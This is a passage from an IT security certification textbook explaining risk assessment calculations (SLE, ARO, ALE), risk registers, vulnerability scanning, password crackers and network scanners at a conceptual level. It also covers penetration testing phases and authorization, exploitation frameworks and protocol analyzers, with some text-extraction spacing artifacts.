threats, vulnerabilities, and existing controls. example, consider a library computer that has up-to-date antivirus protection and cannot access the Internet. Based on these conditions, the risks are l o w. However, if administrators connect the system to the Internet, or fail to keep the antivirus software up to date, the riskincreases.
I t ’s common to perform risk assessments on new systems or applications. example, if an organization is considering adding a new service or application that can increase revenue, it will often perform a risk assessment. This helps it determine if the potential risks may offset the potential gains.
Risk assessments use quantitative measurements or qualitative measurements. Quantitative measurements use numbers, such as a monetary figure representing cost and asset values. Qualitative measurements use judgments. Both methods have the same core goal of helping management make educated decisions based on priorities.
Quantitative Risk Assessment
A quantitative risk assessment measures the risk using a specific monetary amount. This monetary amount makes it easier to prioritize risks. example, a risk with a potential loss of
$30,000 is much more important than a risk with a potential loss of $1,000.
The asset value is an important element in a quantitative risk assessment. It may include the revenue value or replacement value of an asset. A web server may generate $10,000 in revenue per hour. If the web server fails, the company will lose $10,000 in direct sales each hour it’s down, plus the cost to repair it. It can also result in the loss of future business if customers take their business elsewhere. In contrast, the failure of a library workstation may cost a maximum of
$1,000 to replace it.
One commonly used quantitative model uses the following values to determine risks:
Single loss expectancy (SLE). The SLE is the cost of any single loss. Annual rate of occurrence (ARO). The ARO indicates how many times the loss will occur in a year. If the ARO is less than 1, the ARO is represented as a percentage. example, if you anticipate the occurrence once every two years, the ARO is 50 percent or.5.
Annual loss expectancy (ALE). The ALE is the value of SLE × ARO. Imagine that employees at your company lose, on average, one laptop a month. Thieves have stolen them when employees left them in conference rooms during lunch, while they were on-site at customer locations, and from
training rooms.
Someone suggested purchasing hardware locks to secure these laptops for a
total of $1,000. These locks work similar to bicycle locks and allow employees to wrap the cable around a piece of furniture and connect into the laptop. A thief needs to either destroy the laptop to remove the lock or take the furniture with him when stealing the laptop. Should your company purchase them? With a little analysis, the decision is easy.
You have identified the average cost of these laptops, including the hardware, software, and data, is $2,000 each. This assumes employees do not store entire databases of customer information or other sensitive data on the systems, which can easily result in much higher costs. You can now calculate the SLE, ARO, and ALE as follows:
SLE. The value of each laptop is $2,000, so the SLE is $2,000. ARO. Employees lose about one laptop a month, so the ARO is 12.
ALE. You calculate the ALE as SLE × ARO, so $2,000 × 12 = $24,000.
Security experts estimate that these locks will reduce the number of lost or stolen laptops from 12 a year to only 2 a year. This changes the ALE from $24,000 to only $4,000 (saving $20,000 a year). In other words, the organization can spend $1,000 to save $20,000. It doesn’t take a rocket scientist to see that this is a good fiscal decision, saving a net of $19,000. Buy them.
Managers use these two simple guidelines for most of these decisions: If the cost of the control is less than the savings, purchase it.
If the cost of the control is greater than the savings, accept the risk. The organization might be considering other controls, such as a combination of hardware locks, biometric authentication, LoJack for Laptops, and more. The final cost of all of these controls is $30,000 per year. Even if a
laptop is never stolen again, the company is spending
$30,000 to save $24,000, resulting in a higher net loss—they’re losing $6,000 more a year.
Admittedly, a company could choose to factor in other values, such as the sensitivity of data on the laptops, and make a judgment to purchase these additional controls. However, if they’re using a quantitative risk assessment, these values would need to be expressed in monetary terms.
Although you would normally know the SLE and ARO and use these to calculate the ALE, you might occasionally have the SLE and ALE, but not know the ARO. Using basic algebra, you can reformat the formula. Any of these arevalid:
ALE = SLE × ARO ARO=ALE/SLE SLE=ALE/ARO
 Qualitative Risk Assessment
A qualitative risk assessment uses judgment to categorize risks based on likelihood of occurrence (or probability) and impact. The likelihood of occurrence is the probability that an event will occur, such as the likelihood that a threat will attempt to exploit a vulnerability. Impact is the magnitude of harm resulting from a risk. It includes the negative results of an event, such as the loss of confidentiality, integrity, or availability of a system or data.
Notice that this is much different from the exact numbers provided by a quantitative assessment that uses monetary figures. You can think of quantitative as using a quantity or a number, whereas qualitative is related to quality, which is often a matter of judgment.
Some qualitative risk assessments use surveys or focus groups. They canvass experts to provide their best judgments and then tabulate the results. example, a survey may ask the experts to rate the probability and impact of risks associated with a web server selling products on the Internet and a library workstation without Internet access. The experts would use words such as low, medium, and high to rate them.
They could rate the probability of a web server being attacked as high, and if the attack takes the web server out of service, the impact is also high. On the other hand, the probability of a library workstation being attacked is low, and, even though a library patron may be inconvenienced, the impact is also low.
It’s common to assign numbers to these judgments. example, you can use terms such as low, medium, and high, and assign values of 1, 5, and
10, respectively. The experts assign a probability and impact of each risk using low, medium, and high, and when tabulating the results, you change the words to numbers. This makes it a little easier to calculate the results.
In the web server and library computer examples, you can calculate the risk by multiplying the probability and the impact:
Web server. High probability and high impact: 10 × 10 = 100
Library computer. Low probability and low impact: 1 × 1 = 1 Management can look at these numbers and easily determine how to
allocate resources to protect against the risks. They would allocate more resources to protect the web server than the library computer.
One of the challenges with a qualitative risk assessment is gaining consensus on the probability and impact. Unlike monetary values that you can validate with facts, probability and impact are often subject to debate.
Documenting the Assessment
- The final phase of the risk assessment is the report. This identifies the risks discovered during the assessment and the recommended controls. As a simple example, a risk assessment on a database-enabled web application may discover that it’s susceptible to SQL injection attacks. The risk assessment will then recommend rewriting the web application with input
validation techniques or stored procedures to protect the database.
- Management uses this to decide which controls to implement and which controls to accept. In many cases, a final report documents the managerial decisions. Of course, management can decide not to implement a control,
but instead accept a risk.
- Think how valuable this report will be for an attacker. They won’t need to
dig to identify vulnerabilities or controls. Instead, the report lists all the details. Even when management approves controls to correct the vulnerabilities, it may take some time to implement them. Because of this, the results of a risk assessment are highly protected. Normally, only executive management and security professionals will have access to these reports.
Risk Registers
Some risk assessments use a risk register. There are different definitions for a risk register, depending on which standard you’re following. example, ISO 73:2009 defines it as a “record of information about identified risks.” Projects IN Controlled Environments (PRINCE2), a detailed project management method, defines a risk register as a “repository for all risks identified and includes additional information about each risk.”
An easy way to create a risk register is in a table format. example, imagine you are evaluating risks related to a new e-commerce web site that accesses a back-end database. Your risk register might include the following columns:
Category. Risk categories could include downtime due to hardware failures, outages from an attack, downtime to database server failure, data breaches, and more.
Specific risk. One of the risks related to hardware failures could be hard drive failure. Of course, there are other potential hardware
failures, but the remaining columns for this risk will focus on hard drive failure. For this example, imagine that one drive holds the operating system and applications. A second drive holds data.
Likelihood of occurrence. Medium. This assumes that the installed hard drives are not currently using a redundant array of inexpensive disks (RAID) disk subsystem.
Impact. High. If a hard drive fails, it will probably disable the entire web site. Risk score. 50 (out of 100). This assumes a score of Medium has a value of 5 and a score of High has a value of 10 (5 × 10 = 50). Note that organizations can assign any desired v a l u e s to the likelihood of occurrence and impact. The values used here are simply an example. Security controls or mitigation steps. Implement a RAID-1 to protect the hard drive hosting the operating system. Implement a RAID-6 to protect the data.
Contingencies. Ensure backups exist and are kept up to date.
Risk score with security controls. 10 (out of 100). With the RAID-1 and RAID-6 in place, the likelihood of occurrence is now Low, but the impact remains High. The new score assumes a score of Low has a value of 1 and a score of High has a value of 10 (1 × 10 = 10).
Action assigned to. A risk register may document who has responsibility for implementing the security control.
Action deadline. The deadline identifies when the security control should be implemented.
Organizations might use columns such as these or modify them as they see fit. The key is that the risk register documents relevant risks based on the needs of the organization.
Supply Chain Assessment
A supply chain includes all the elements required to produce and sell a product. As a simple example, consider the Lard Lad Donuts store. They require a steady supply of flour, sugar, eggs, milk, oil, and other ingredients. They also require equipment such as refrigerators to store raw materials, space to manufacture the donuts, and fryers to cook them. Last, they need a method to sell the donuts to customers. If any of these items fail, the company won’t be able to make and sell donuts. It’s important to realize that the supply chain isn’t only the supply of raw materials. It also includes all the processes required to create and distribute a
finished product.
A supply chain assessment evaluates these elements—the raw materials
supply sources and all the processes required to create, sell, and distribute the product. In some cases, the assessment focuses on identifying risks. example, are there any raw materials that come from only a single source? It would also examine processes and identify any tasks or steps that represent a single point of failure. If the donut store has only one fryer, it is a single point of failure. If it breaks, all sales stop.
Many organizations have mature supply chains. In other words, they have multiple sources in place for all raw materials. The failure of any single supply source will not affect the organization’s ability to create and sell its products. Similarly, they have built-in redundancies in their processes. If any internal processes fail, they have alternative methods ready to implement and keep the organization operating.
Organizations with mature supply chains still perform supply chain assessments. The goal of these assessments is to look for methods to improve the supply chain.
 Comparing Scanning and Testing Tools
Security administrators use tools to test their networks. Two common categories of tools are vulnerability scanners, which check for weaknesses and penetration tests, which attempt to exploit the vulnerabilities. This section covers vulnerability scanners and penetration tests in more depth.
Checking for Vulnerabilities
Vulnerabilities are weaknesses, and by reducing vulnerabilities, you can reduce risks. That sounds simple enough. However, how do you identify the vulnerabilities that present the greatest risks? Common methods are vulnerability assessments and various scans such as network scans and vulnerability scans. The overall goal of a vulnerability assessment is to assess the security posture of systems and networks. They identify vulnerabilities, or weaknesses, within systems, networks, and organizations, and are part of an overall risk management plan.
Vulnerability assessments can include information from a wide variety of sources. This includes reviewing security policies and logs, interviewing personnel, and testing systems. Assessments often use a variety of scans and penetration tests, all discussed in this section. A vulnerability assessment typically includes the following high-level steps:
Identify assets and capabilities.
Prioritize assets based on value.
Identify vulnerabilities and prioritize them.
Recommend controls to mitigate serious vulnerabilities.
Many organizations perform vulnerability assessments internally. Organizations also hire external security professionals to complete external assessments. The following sections discuss many of the common tools used for vulnerability assessments and vulnerability scans.
Password Crackers
A password cracker attempts to discover a password. Passwords are typically encrypted or hashed so that they aren’t easily readable. Chapter 10, “Understanding Cryptography and PKI,” covers both encryption and hashing methods. Some methods are stronger than others. If passwords are protected with weak methods, a password cracker can discover the password.
example, Message Digest 5 (MD5) is a hashing algorithm. When executed against a passwordofP@ssw0rd, it creates the following MD5hash:161ebd7d45089b3446ee4e0d86dbcf92. A password cracker can analyze the MD5 hash of 161ebd7d45089b3446ee4e0d86dbcf92 and discover the actual password of P@ssw0rd. Chapter 7, “Protecting Against Advanced Attacks,” discusses many of the common methods used to crack passwords. The point here is that password crackers are one of the tools security administrators use during a vulnerability assessment.
There are two categories of password crackers—offline and online:
An offline password cracker attempts to discover passwords by analyzing a database or file containing passwords. example,
attackers often obtain large volumes of data during a data breach. This includes files that include hashed or encrypted passwords. They can then analyze the protected passwords to discover the actual passwords. A key benefit of an offline password cracking attack is that attackers have unlimited time to analyze the passwords.
An online password cracker attempts to discover passwords by guessing them in a brute force attack. example, some online password crackers attempt to discover the passwords for specific accounts by trying to log on to the accounts remotely. Other online password crackers collect network traffic and attempt to crack any passwords sent over the network.
Network Scanners
A network scanner uses various techniques to gather information about hosts within a network. example, Nmap (covered in more depth later in this chapter) is a popular network scanning tool that can give you a lot of information about hosts within a network. Other popular network scanning tools are Netcat and Nessus. Network scanners typically use the following methods:
Ping scan. A ping scan (sometimes called a ping sweep) sends an Internet Control Message Protocol (ICMP) ping to a range of IP addresses in a network. If the host responds, the network scanner knows there is a host operational with that IP address. A problem with ping scans is that firewalls often block ICMP, so it can give inconsistent results.
Arp ping scan. Chapter 1, “Mastering Security Basics,” discusses the Address Resolution Protocol (ARP) and how systems use it to resolve IP addresses to media access control (MAC) addresses. Any host that receives an ARP packet with its IP address responds with its MAC address. If the host responds, the network scanner knows that a host is operational with that IP address.
Syn stealth scan. Chapter 3, “Exploring Network Technologies and Tools,” discusses the Transmission Control Protocol (TCP) three- way handshake. As a reminder, one host sends out a SYN (synchronize) packet to initiate a TCP session. The other host responds with a SYN/ACK (synchronize/acknowledge) packet. The first host then completes the handshake with an ACK packet to establish the connection. A syn stealth scan sends a single SYN packet to each IP address in the scan range. If a host responds, the scanner knows that a host is operational with that IP address. However, instead of responding with an ACK packet, a scanner typically sends an RST (reset) response to close the connection.
Port scan. A port scan checks for open ports on a system. Each open port indicates the underlying protocol is running on the system. example, if port 80 is open, it indicates the host is running HTTP and it is likely running a web server. A port scan typically uses the ports identified as well-known ports by the Internet Assigned Numbers Authority (IANA).
Service scan. A service scan is like a port scan, but it goes a step further. A port scan identifies open ports and gives hints about what protocols or services might be running. The service scan verifies the protocol or service. example, if a port scan identifies port 80 is open, a service scan will send an HTTP command, such as “Get /.” If HTTP is running on port 80, it will respond to the Get command
providing verification that it is a web server.
OS detection. Operating system (OS) detection techniques analyze
packets from an IP address to identify the OS. This is often referred to as TCP/ IPfingerprinting.Asasimpleexample,theTCPwindowsize(the sizeof the receivewindowinthefirstpacketofaTCPsession)isnotfixed. Different operatingsystemsusedifferentsizes.SomeLinuxversionsusea size of 5,840 bytes, Cisco routers use a size of 4,128 bytes, and some different Windows versionsusesizesof8,192and65,535.OSdetection techniquesdon’trelyona single value but typically evaluate multiple values included in responses from systems. Figure 8.1 shows the result of a scan using Zenmap (the graphical version of Nmap). After starting it, I entered 192.168.0.0/24 as the Target. Nmap then scanned all the IP addresses from 192.168.0.1 to 192.168.0.254. After the scan completed, I selected the host with the IP address of 192.168.0.12 and selected the Ports/Hosts tab. Nmap discovered that this is a printer, the name and serial number of the printer, and that the printer is
hosting an embedded web site running on port 80.  Figure 8.1: Zenmap scan
Network Mapping
Network mapping discovers devices on the network and how they are connected with each other. It is often done as part of a network scan, but it only focuses on connectivity. In contrast, a full network scan also includes additional scans to identify open ports, running services, and OS details.
Some tools, such as Zenmap, provide y o u with a graphical representation of the network. To see how this looks, look a t the Nmap and Zenmap labs available at http://gcgapremium.com/501labs/.
Wireless Scanners/Cracker
Chapter 4, “Securing Your Network,” discusses how administrators often perform site surveys while planning and deploying a wireless network. Security personnel periodically repeat the site survey to verify the environment hasn’t changed.
Wireless scanners can typically use both passive and active scans. When using a passive scan, a scanner just listens to all the traffic being broadcast on
 known channels within the 2.4 GHz and 5 GHz frequency ranges.
Figure 8.2 shows a screenshot from Acrylic Wi-Fi Professional, a wireless scanner with many capabilities. As with many scanners, it can collect and report quite a bit of information on local APs.
 Figure 8.2: Acrylic Wi-Fi Professional
The following bullets describe some of the columns in Figure 8.2:
SSIDs. A scanner will detect the service set identifier (SSID) of all access
points within range of the scanner.
MAC addresses. It shows the MAC, or hardware address of the AP. Signal strength. The signal strength typically identifies how near (or how far away) the AP is in relation to the computer performing the scan. Channels. This helps administrators determine if nearby APs are broadcasting on the same channel, causing interference.
Channel widths. A channel is typically 20 MHz wide, but when an AP is using two channels, it is 40 MHz. The scanner will show this information.
Security. The scanner will show if the AP is in Open mode or using one of the other wireless cryptographic protocols: Wi-Fi Protected Access (WPA) or Wi-Fi Protected Access II (WPA2). Chapter 4 discusses these
modes in more depth.
When using an active scan, a wireless scanner acts like a scanner/cracker
and can gain more information about an AP by sending queries to it. example, Chapter 4 discusses various attacks, including
Wi-Fi Protected Setup (WPS) attacks. A WPS attack keeps guessing PINs until it discovers the eight-digit PIN used by an AP. It can then use this to discover the pre-shared key (PSK) used by the AP. Various wireless scanners have other capabilities, including password crackers using other methods.
Rogue System Detection
Chapter 4 discusses rogue APs, which are APs placed into service without authorization. As long as an administrator knows what APs are authorized, i t ’s easy to discover rogue APs with a wireless scan. Administrators often perform site surveys while planning and deploying a wireless network. example, Figure 8.2 (the screenshot from Acrylic Wi- Fi Professional in the previous section) shows all the SSIDs it has detected.
Administrators can investigate any unknown SSIDs. The received signal strength indicator (RSSI) shows the strength of the signal. A lower negative number (closer to zero) is stronger than a higher negative number. By installing the wireless scanner on a laptop and walking around an organization, you can locate rogue APs. As you move closer to a rogue AP, the signal becomes stronger. As you move farther away from it, the signal becomes weaker.
Banner Grabbing
Banner grabbing is a technique used to gain information about remote systems and many network scanners use it. It is often used to identify the operating system along with information about some applications. If successful, the server returns a Hypertext Markup Language (HTML) banner providing information on the server. The banner might look something like the following:
<!DOCTYPE HTML PUBLIC“-//IETF//DTD HTML 2.0//EN”> <html><head><title>501 Method Not Implemented</title></head> <body>
<h1>Method Not Implemented</h1>
<p>GET to /index.html not supported.<br /></p>
<p>Additionally, a 404 Not Found error was encountered.</p><hr>
<address>Apache/2.2.25 (Unix) mod_ssl/2.2.25 OpenSSL/1.0.0-fips mod_auth_ passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at 72.52.230.233 Port 80
</ address> </body></html>
Most of this is formatting. However, the information in the address section provides a lot of information on the web server. It shows this is a Unix server running the Apache web server software along with additional information. The command-line tool Netcat can be used for banner grabbing, as shown later in this chapter. You can also check out the Banner Grabbing Lab in the online exercises for this book at http://gcgapremium.com/501labs/.
Vulnerability Scanning
A key part of a vulnerability assessment is a vulnerability scan. Security administrators often use a vulnerability scanner to identify which systems are susceptible to attacks. Vulnerability scanners identify a wide range of weaknesses and known security issues that attackers can exploit. Most vulnerability scanners combine multiple features into a single package. A vulnerability scan often includes the following actions:
Identify vulnerabilities
Identify misconfigurations Passively test security controls Identify lack of security controls
 Identifying Vulnerabilities and Misconfigurations
Vulnerability scanners utilize a database or dictionary of known vulnerabilities and test systems against this database. example, the MITRE Corporation maintains the Common
Vulnerabilities and Exposures (CVE) list, which is a dictionary of publicly known security vulnerabilities and exposures. This is similar to how antivirus software detects malware using virus signatures. The difference is that the CVE is one public list funded by the U.S. government, whereas antivirus vendors maintain proprietary signature files.
Other standards used by vulnerability scanners include the Security Content Automation Protocol (SCAP). SCAP utilizes the National Vulnerability Database (NVD), which includes lists of common misconfigurations, security- related software flaws, and impact ratings or risk scores. The risk scores quantify risks, allowing security experts to prioritize vulnerabilities. The SCAP also includes risk scores for items in the CVE.
Additionally, attackers often look for systems that are misconfigured and vulnerability scanners can detect some common misconfiguration settings. Some of the vulnerabilities and common misconfigurations discovered by a vulnerability scanner include:
Open ports. Open ports can signal a vulnerability, especially if administrators aren’t actively managing the services associated with these ports. example, all web servers do not use File Transfer Protocol (FTP), so if TCP ports 20 and 21 are open, it indicates a potential vulnerability related to FTP. Similarly, Telnet uses port 23, so if this port is open, an attacker can try to connect to the server using Telnet.
Weak passwords. Many scanners include a password cracker that can discover weak passwords or verify that users are creating strong passwords in compliance with an organization’s policy. It is more efficient to use a technical password policy to require and enforce the use of strong passwords. However, if this isn’t possible, administrators use a separate password cracker to discover weak passwords.
Default accounts and passwords. Operating systems and applications can have default usernames and passwords. Basic operating system and application hardening steps should remove the defaults, and a scan can discover the weaknesses if operating systems and applications aren’t secured properly. example, some SQL database systems allow the sa (system administrator) account to be enabled with a blank password. Scanners such as Nessus will detect
this.
Sensitive data. Some scanners include data loss prevention (DLP) techniques to detect sensitive data sent over the network. example, a DLP system can scan data looking for patterns such as Social Security numbers or key words that identify classified or proprietary data. Security and configuration errors. Vulnerability scans can also check the system against a configuration or security baseline to identify unauthorized changes.
Administrators can scan specific systems or an entire network. example, many organizations perform periodic scans on the entire network to detect vulnerabilities. If an administrator makes an unauthorized change resulting in a vulnerability, the scan can detect it. Similarly, if a rebuilt system is missing some key security settings, the scan will detect them. It’s also possible to scan a new system before or right after it’s deployed.
Passively Testing Security Controls
An important point about a vulnerability scan is that it does not attempt to exploit any vulnerabilities. Instead, a vulnerability scan is a passive attempt to identify weaknesses. This ensures that the testing does not interfere with normal operations. Security administrators then assess the vulnerabilities to determine which ones to mitigate. In contrast, a penetration test (covered later in this chapter) is an active test that attempts to exploit vulnerabilities.
 Identifying Lack of Security Controls
Vulnerability scanners can also identify missing security controls, such as the lack of up-to- date patches or the lack of antivirus software. Although many patch management tools include the ability to verify systems are up to date with current patches, vulnerability scanners provide an additional check to detect unpatched systems.
False Positive
Unfortunately, vulnerability scanners aren’t perfect. Occasionally, they report a vulnerability when it doesn’t actually exist. In other words, the scan indicates a system has a known vulnerability, but the report is false. example, a vulnerability scan on a server might report that the server is missing patches related to a database application, but the server doesn’t have a database application installed.
This is similar to false positives in an intrusion detection system (IDS) where the IDS alerts on an event, but the event isn’t an actual intrusion. Similarly, an antivirus scanner can identify a useful application as malware, even though the application does not have any malicious code. False positives can result in higher administrative overhead because administrators have to investigate them.
Credentialed Versus Non-Credentialed
Vulnerability scanners can run as a credentialed scan using the credentials of an account, or as non-credentialed without any user credentials. Attackers typically do not have credentials of an internal account, so when they run scans against systems, they run non-credentialed scans.
Security administrators often run credentialed scans with the privileges of an administrator account. This allows the scan to check security issues at a much deeper level than a non- credentialed scan. Additionally, because the
 credentialed scan has easier access to internal workings of systems, it results in a lower impact on the tested systems, along with more accurate test results and fewer false positives. It’s worth mentioning that attackers typically start without any credentials but use
privilege escalation techniques to gain administrative access. This allows them to run a credentialed scan against a network if desired. Similarly, even thougha credentialed scan is typically more accurate, administrators often run non- credentialed scans to see what an attacker without credentials would see.
Configuration Compliance Scanner
A configuration compliance scanner verifies that systems are configured correctly. They will often use a file that identifies the proper configuration for systems. When running the scan, the scanner will verify that systems have the same configuration defined in the configuration file. This is also known as configuration validation. Security administrators often configure these tools to use automation or scripting methods so that they automatically run on a set schedule.
example, Nessus, a vulnerability scanner developed by Tenable Network Security, uses plug-ins to perform configuration compliance scans. They currently have plug-ins used to perform against both Windows and Unix systems. Administrators can also create custom audit files to perform custom compliance configuration scans on Windows and Unix systems. AutoNessus is a free tool that can be used to automate Nessus scans.
Configuration compliance scans typically need to be run as credentialed scans. This helps ensure they can accurately read the configuration of systems during thescan.
Obtaining Authorization
It’s important to obtain vulnerability testing authorization and penetration testing authorization before performing any vulnerability testing or penetration testing. In most cases, this consent is in writing. If it isn’t in writing, many security professionals won’t perform the test. A penetration test without consent is an attack. An organization may perceive a well- meaning administrator doing an unauthorized penetration test as a black hat or gray hat attacker. The administrator might be updating his résumé after running an unauthorized scan or penetration test.
Many organizations use a written rules-of-engagement document when hiring outside security professionals to perform the test. The rules-of- engagement document identifies the boundaries of the penetration test. If testing does result in an outage even though the testers followed the rules of engagement, repercussions are less likely.
Penetration Testing
Penetration testing actively assesses deployed security controls within a system or network. It starts with passive reconnaissance, such as a vulnerability scan, but takes it a step further and tries to exploit vulnerabilities by simulating or performing an attack.
Security testers typically perform a penetration test to demonstrate the actual security vulnerabilities within a system. This can help the organization determine the impact of a threat against a system. In other words, it helps an organization determine the extent of damage that an attacker could inflict by exploiting a vulnerability.
Although it’s not as common, it’s also possible to perform a penetration test to determine how an organization will respond to a compromised system. This allows an organization to demonstrate security vulnerabilities and flaws in policy implementation. example, many organizations may have perfect policies on paper. However, if employees aren’t consistently following the policies, a penetration test can accurately demonstrate the flaws.
Because a penetration test can exploit vulnerabilities, it has the potential to disrupt actual operations and cause system instability. Because of this, it’s important to strictly define boundaries for a test. Ideally, the penetration test will stop right before performing an exploit that can cause damage or result in an outage. However, some tests cause unexpected results.
Testers sometimes perform penetration tests on test systems rather than the live production systems. example, an organization may be hosting a web application accessible on the Internet. Instead of performing the test on the live server and affecting customers, penetration testers or administrators configure another server with the same web application. If a penetration test cripples the test server, it accurately demonstrates security vulnerabilities, but it doesn’t affect customers.
Many penetration tests include the following activities:
Passive reconnaissance Active reconnaissance Initial exploitation Escalation ofprivilege Pivot
Persistence
Passive Reconnaissance
Passive reconnaissance collects information about a targeted system, network, or organization using open-source intelligence. This includes viewing social media sources about the target, news reports, and even the organization’s web site. If the organization has wireless networks, it could include passively collecting information from the network such as network SSIDs. Note that because passive reconnaissance doesn’t engage a target, it isn’t illegal.
Passive reconnaissance does not include using any tools to send information to targets and analyze the responses. However, passive reconnaissance can include using tools to gather information from systems other than the target. example, you can sometimes gain information about a domain name holder using the Whois lookup site (https://www.whois.com). Other times, you can gain information by querying Domain Name System (DNS) servers.
Active Reconnaissance
Active reconnaissance includes using tools to send data to systems and analyzing the responses. It typically starts by using various scanning tools such as network scanners and vulnerability scanners. It’s important to realize that active reconnaissance does engage targets and is almost always illegal. It should never be started without first getting explicit authorization to do so.
The “Network Scanners” section earlier in this chapter discussed how
 tools such as Nmap and Nessus can gather a significant amount of information about networks and individual systems. This includes identifying all IP addresses active in a network, the ports and services active on individual systems, and the operating system running on individual systems.
 Initial Exploitation
After scanning the target, testers discover vulnerabilities. They then take it a step further and look for a vulnerability that they can exploit. example, a vulnerability scan may discover that a system doesn’t have a patch installed for a known vulnerability. The vulnerability allows attackers (and testers) to remotely access the system and install malware on it.
With this knowledge, the testers can use known methods to exploit this vulnerability. This gives the testers full access to the system. They can then install additional software on the exploited system.
Escalation of Privilege
In many penetration tests, the tester first gains access to a low-level system or low-level account. example, a tester might gain access to Homer’s computer using Homer’s user account. Homer has access to the network, but doesn’t have any administrative privileges. However, testers use various techniques to gain more and more privileges on Homer’s computer and his network.
Chapter 6 discusses privilege escalation tactics that attackers often use. The “One Click Lets Them In” section discusses how advanced persistent threats (APTs) often use remote access Trojans (RATs) to gain access to a single system. Attackers trick a user into clicking a malicious link, which gives them access to a single computer. Attackers then use various scripts to scan the network looking for vulnerabilities. By exploiting these vulnerabilities, the attackers gain more and more privileges on the network. Penetration testers typically use similar tactics. Depending on how much they are authorized to do, testers can use other methods to gain more and more access to a network.
Pivot
Pivoting is the process of using various tools to gain additional information. F o r example, imagine a tester gains access to Homer’s computer within a company’s network. The tester can then pivot and use Homer’s computer to gather information on other computers. Homer might have access to network shares filled with files on nuclear power plant operations. The tester can use Homer’s computer to collect this data and then send it back out of the network from Homer’s computer.
Testers (and attackers) can use pivoting techniques to gather a wide variety of information. Many times, the tester must first use escalation of privilege techniques to gain more privileges. However, after doing so, it’s possible that the tester can access databases (such as user accounts and password databases), email, and any other type of data stored within a network.
 Persistence
Attackers often use various threats that allow them to stay within a network for weeks, months, or even years without being detected. Penetration testing techniques use similar techniques to maintain persistence within the network.
A common technique used to maintain persistence is to create a backdoor back into the network. example, a tester may be able to create alternate accounts that can be accessed remotely. In some cases, it’s also possible to install or modify services to connect back into a system. example, a tester may be able to enable Secure Shell (SSH) and then create a method used to log on to a system using SSH. White, Gray, and Black Box Testing
It’s common to identify testing based on the level of knowledge the testers have prior to starting the test. These testers could be internal employees or external security professionals working for a third-party organization hired to perform the test. The three types of testing are:
Black box testing. Testers have zero knowledge of the environment prior to starting a black box test. Instead, theyapproach the test with the same knowledge as an attacker. When testing new applications, black box testers wouldn’t have any prior experience with the application. When testing networks, they aren’t provided any information or documentation on the network before the test. Black box testers often use fuzzing to check for application vulnerabilities.
White box testing. Testers have full knowledge of the environment before starting a white box test. example, they would have access to product documentation, source code, and possibly even logon details. Gray box testing. Testers have some knowledge of the
environment prior to starting a gray box test. example, they might have access to some network documentation, but not know the full network layout.
You may also come across the terms black hat, white hat, and gray hat. These aren’t referring to testers but instead to different types of attackers. They are reminiscent of the Wild West, where you could easily identify the good guys and the bad guys by the color of their hat. Black hat identifies a malicious attacker performing criminal activities. White hat identifies a
security professional working within the law. Gray hat identifies individuals who may have good intentions, but their activities may cross ethical lines. example, an activist, sometimes called a hacktivist, may use attack methods to further a cause, but not for personal gain.
 Hackers and crackers are terms you may also come across. Originally, a hacker indicated someone proficient with computers who wanted to share knowledge with others. They weren’t malicious. In contrast, a cracker was a proficient hacker who used the knowledge for malicious purposes. However, English is a living language that continues to evolve and the media consistently uses the term hacker to identify malicious attackers. This book often uses the term attacker to identify an individual attacking a system for malicious purposes.
Intrusive Versus Non-Intrusive Testing
Scans can be either intrusive or non-intrusive. You can also think of these terms as invasive and non-invasive, respectively. Tools using intrusive methods can potentially disrupt the operations of a system. In contrast, tools using non- intrusive methods will not compromise a system. These terms also apply to penetration testing (intrusive) and vulnerability scanning (non- intrusive).
When comparing penetration testing and vulnerability scanning, it’s important to remember that penetration tests are intrusive and more invasive than vulnerability scans. They involve probing a system and attempting to exploit any vulnerabilities they discover. If they successfully exploit a vulnerability, a penetration test can potentially disrupt services and even take a system down.
Vulnerability scans are generally non-intrusive and less invasive than penetration tests. They never attempt to exploit a vulnerability. Because of this, a vulnerability scan is much safer to run on a system or network because it is significantly less likely that it will affect services.
Passive Versus Active Tools
In the context of tools used to discover security threats and vulnerabilities, it’s important to understand the difference between passive
tools and active tools. A passive tool tests systems in a non-intrusive manner and has little possibility of compromising a system. An active tool uses intrusive and invasive methods and can potentially affect the operations of a system.
The “Vulnerability Scanning” section earlier in this chapter mentioned that vulnerability scanning is passive, and penetration testing is active. In this context, passive doesn’t mean that a vulnerability scanner isn’t doing anything. It certainly is probing systems to identify vulnerabilities and other problems. However, it does not take any action to exploit these vulnerabilities.
That doesn’t mean that you can feel free to run a vulnerability scanner on any network simply because it is passive and non-intrusive. If your actions are
discovered, you might be identified as an attacker and face legal action.
 Exploitation Frameworks
An exploitation framework is a tool used to store information about security vulnerabilities. It is often used by penetration testers (and attackers) to detect and exploit software. Exploitation frameworks typically include tools used to check for vulnerabilities and execute exploits on any discovered vulnerabilities. Chapter 4 discusses intrusion detection systems (IDSs) and many IDSs use information from an existing framework to detect attacks. Some commonly used exploitation frameworks are:
Metasploit Framework. Metasploit is an open source project that runs on Linux systems. It has data on over 1,600 exploits and includes methods to develop, test, and use exploit code. Rapid7 acquired Metasploit in 2009. While the framework is still free and open source, there are more advanced editions available for purchase.
BeEF (Browser Exploitation Framework). BeEF is an open source web browser exploitation framework. It focuses on identifying web browser vulnerabilities. Successful attacks allow testers (and attackers) to launch attacks from within an exploited web browser.
w3af (Web Application Attack and Audit Framework). This open source framework focuses on web application vulnerabilities. The stated goal is to find and exploit all web application vulnerabilities and make this information known to others. Web application developers can then ensure their web applications are not vulnerable to the exploits.
Using Security Tools Several tools are available for use by security professionals and attackers alike. Vulnerability scanners were discussed at length earlier in this chapter, including their use as ping scanners and port scanners. However, other tools are available. This section discusses tools such as protocol analyzers, command- line tools, logs, and audits.
Sniffing with a Protocol Analyzer
A protocol analyzer can capture and analyze packets on a network. The
process of using a protocol analyzer is sometimes referred to as sniffing or using a sniffer. Both administrators and attackers can use a protocol analyzer to view IP headers and examine packets. example, administrators can use a protocol analyzer to troubleshoot communication issues between network systems, or identify potential attacks using manipulated or fragmented packets.
Attackers can use a protocol analyzer to capture data sent across a network in cleartext. example, unencrypted credentials are usernames and passwords sent across a network in cleartext. One of the ways attackers can view this data is by connecting an unauthorized switch within a network to capture traffic and forward it to a system running a protocol analyzer. If cabling isn’t protected, they might be able to simply connect a switch above a drop-down ceiling. Wireshark is a free protocol analyzer that y o u can download from the Wireshark site: http://www.wireshark.org/.
